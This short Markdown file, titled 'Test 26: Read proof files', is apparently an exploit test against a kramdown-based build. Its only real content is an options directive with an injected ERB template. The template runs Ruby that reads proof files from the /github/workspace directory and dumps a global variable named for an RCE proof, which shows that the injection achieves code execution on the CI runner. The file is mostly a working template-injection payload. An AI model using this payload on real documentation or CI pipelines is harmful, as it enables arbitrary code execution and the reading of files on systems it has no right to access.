---
---

# Test 26: Read proof files

{::options template="string://<%= r=''; begin; r=r+'SH_PROOF='+File.read('/github/workspace/sh-rce-proof.txt')[0..300]+\"\\n\"; rescue => e; r=r+'SH_PROOF_ERR='+e.message+\"\\n\"; end; begin; r=r+'RCE3_PROOF='+File.read('/github/workspace/rce3-proof.txt')[0..300]+\"\\n\"; rescue => e; r=r+'RCE3_ERR='+e.message+\"\\n\"; end; begin; r=r+'SH_LOADED='+$syntax_hl_rce_proof.to_s[0..200]+\"\\n\"; rescue => e; r=r+'SH_VAR='+e.message+\"\\n\"; end; r %>" /}

placeholder
